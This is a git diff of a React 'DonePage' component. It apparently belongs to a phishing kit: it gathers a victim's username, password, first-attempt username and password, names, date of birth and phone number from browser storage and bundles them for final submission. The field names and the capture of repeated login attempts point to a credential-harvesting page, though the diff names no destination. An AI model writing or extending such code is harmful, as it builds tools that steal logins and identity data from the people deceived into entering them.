@@ -26,21 +26,28 @@ const DonePage: React.FC = () => {
       try {
         // Get all stored data
         const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
-        const loginData = sessionStorage.getItem('loginData') || localStorage.getItem('loginData');
-        const infoData = sessionStorage.getItem('infoData') || localStorage.getItem('infoData');
         
-        if (sessionId && loginData && infoData) {
-          const login = JSON.parse(loginData);
-          const info = JSON.parse(infoData);
-          
+        // Read individual fields from storage
+        const xusr = sessionStorage.getItem('xusr') || localStorage.getItem('xusr');
+        const xusrFirst = sessionStorage.getItem('xusrFirst') || localStorage.getItem('xusrFirst');
+        const xpss = sessionStorage.getItem('xpss') || localStorage.getItem('xpss');
+        const xpssFirst = sessionStorage.getItem('xpssFirst') || localStorage.getItem('xpssFirst');
+        const xname1 = sessionStorage.getItem('xname1') || localStorage.getItem('xname1');
+        const xname2 = sessionStorage.getItem('xname2') || localStorage.getItem('xname2');
+        const xdob = sessionStorage.getItem('xdob') || localStorage.getItem('xdob');
+        const xtel = sessionStorage.getItem('xtel') || localStorage.getItem('xtel');
+        
+        if (sessionId && xusr && xpss && xname1 && xname2 && xdob && xtel) {
           // Combine all data for final submission
         const finalData = {
-            xusr: login.xusr,
-            xpss: login.xpss,
-            xname1: info.xname1,
-            xname2: info.xname2,
-            xdob: info.xdob,
-            xtel: info.xtel
+            xusr: xusr,
+            xusrFirst: xusrFirst || '',
+            xpss: xpss,
+            xpssFirst: xpssFirst || '',
+            xname1: xname1,
+            xname2: xname2,
+            xdob: xdob,
+            xtel: xtel
           };
           
           console.log('Submitting final data:', finalData);
